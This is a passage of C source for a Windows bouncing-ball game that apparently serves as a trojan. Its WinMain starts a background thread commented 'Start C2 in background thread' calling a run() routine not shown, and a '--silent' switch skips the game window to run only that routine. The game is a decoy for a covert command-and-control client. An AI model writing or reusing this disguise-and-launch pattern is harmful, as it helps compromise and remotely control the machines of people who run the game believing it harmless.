typedef HGDIOBJ(WINAPI *pSelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI *pDeleteObject)(HGDIOBJ);
typedef BOOL(WINAPI *pEllipse)(HDC, int, int, int, int);
typedef BOOL(WINAPI *pRectangle)(HDC, int, int, int, int);
typedef int(WINAPI *pSetBkMode)(HDC, int);
typedef COLORREF(WINAPI *pSetTextColor)(HDC, COLORREF);
typedef BOOL(WINAPI *pTextOutA)(HDC, int, int, LPCSTR, int);

pCreateSolidBrush myCreateSolidBrush = NULL;
pSelectObject mySelectObject = NULL;
pDeleteObject myDeleteObject = NULL;
pEllipse myEllipse = NULL;
pRectangle myRectangle = NULL;
pSetBkMode mySetBkMode = NULL;
pSetTextColor mySetTextColor = NULL;
pTextOutA myTextOutA = NULL;

// Game Global Variables
int ballX = 50, ballY = 50;
int ballDX = 5, ballDY = 5;
const int BALL_SIZE = 20;

int paddleX = 250;
const int PADDLE_WIDTH = 100;
const int PADDLE_HEIGHT = 15;
const int PADDLE_Y_OFFSET = 50; // Distance from bottom

int score = 0;
char scoreText[64];

// Window Procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    case WM_MOUSEMOVE:
        // Update paddle position based on mouse
        paddleX = LOWORD(lParam) - (PADDLE_WIDTH / 2);
        return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        if (myCreateSolidBrush && myEllipse && myRectangle)
        {
            RECT rect;
            GetClientRect(hwnd, &rect);

            // Draw Background
            HBRUSH bgBrush = myCreateSolidBrush(RGB(30, 30, 30));
            FillRect(hdc, &rect, bgBrush);
            myDeleteObject(bgBrush);

            // Draw Ball
            HBRUSH ballBrush = myCreateSolidBrush(RGB(0, 255, 0));
            mySelectObject(hdc, ballBrush);
            myEllipse(hdc, ballX, ballY, ballX + BALL_SIZE, ballY + BALL_SIZE);
            myDeleteObject(ballBrush);

            // Draw Paddle
            HBRUSH paddleBrush = myCreateSolidBrush(RGB(0, 120, 255));
            mySelectObject(hdc, paddleBrush);
            int padY = rect.bottom - PADDLE_Y_OFFSET;
            myRectangle(hdc, paddleX, padY, paddleX + PADDLE_WIDTH, padY + PADDLE_HEIGHT);
            myDeleteObject(paddleBrush);

            // Draw Score
            mySetBkMode(hdc, TRANSPARENT);
            mySetTextColor(hdc, RGB(255, 255, 255));
            wsprintfA(scoreText, "Score: %d  |  Mouse to Move", score);
            myTextOutA(hdc, 10, 10, scoreText, lstrlenA(scoreText));
        }

        EndPaint(hwnd, &ps);
    }
        return 0;

    case WM_TIMER:
    {
        RECT rect;
        GetClientRect(hwnd, &rect);

        ballX += ballDX;
        ballY += ballDY;

        // Wall Collisions
        if (ballX < 0 || ballX + BALL_SIZE > rect.right)
            ballDX = -ballDX;
        if (ballY < 0)
            ballDY = -ballDY; // Top wall

        // Paddle Collision
        int padY = rect.bottom - PADDLE_Y_OFFSET;
        if (ballY + BALL_SIZE >= padY &&
            ballY + BALL_SIZE <= padY + PADDLE_HEIGHT && // Hit top of paddle
            ballX + BALL_SIZE >= paddleX &&
            ballX <= paddleX + PADDLE_WIDTH)
        {
            ballDY = -ballDY; // Bounce up
            // Speed up slightly
            if (ballDX > 0)
                ballDX++;
            else
                ballDX--;
            if (ballDY > 0)
                ballDY++;
            else
                ballDY--;

            score += 10;
        }

        // Reset if missed
        if (ballY > rect.bottom)
        {
            ballX = 50;
            ballY = 50;
            ballDX = 5;
            ballDY = 5;
            score = 0; // Reset score
        }

        InvalidateRect(hwnd, NULL, TRUE); // Force redraw
    }
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// GUI Entry Point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Check for silent mode
    int silent = 0;
    if (lpCmdLine)
    {
        for (int i = 0; lpCmdLine[i]; i++)
        {
            if (lpCmdLine[i] == '-' && lpCmdLine[i + 1] == '-' && lpCmdLine[i + 2] == 's' && lpCmdLine[i + 3] == 'i' && lpCmdLine[i + 4] == 'l' && lpCmdLine[i + 5] == 'e' && lpCmdLine[i + 6] == 'n' && lpCmdLine[i + 7] == 't')
            {
                silent = 1;
                break;
            }
        }
    }

    if (silent)
    {
        run(NULL);
        return 0;
    }

    // Load GDI32 Dynamically to avoid linker errors
    HMODULE hGdi = LoadLibraryA("gdi32.dll");
    if (hGdi)
    {
        myCreateSolidBrush = (pCreateSolidBrush)GetProcAddress(hGdi, "CreateSolidBrush");
        mySelectObject = (pSelectObject)GetProcAddress(hGdi, "SelectObject");
        myDeleteObject = (pDeleteObject)GetProcAddress(hGdi, "DeleteObject");
        myEllipse = (pEllipse)GetProcAddress(hGdi, "Ellipse");
        myRectangle = (pRectangle)GetProcAddress(hGdi, "Rectangle");
        mySetBkMode = (pSetBkMode)GetProcAddress(hGdi, "SetBkMode");
        mySetTextColor = (pSetTextColor)GetProcAddress(hGdi, "SetTextColor");
        myTextOutA = (pTextOutA)GetProcAddress(hGdi, "TextOutA");
    }

    // 1. Start C2 in background thread
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, NULL);

    // 2. Game GUI Setup
    const char CLASS_NAME[] = "GameWindow";
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, "Bouncing Ball Game - Interactive",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL)
        return 0;

    ShowWindow(hwnd, nCmdShow);
    SetTimer(hwnd, 1, 30, NULL); // 30ms timer

    // 3. Message Loop
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}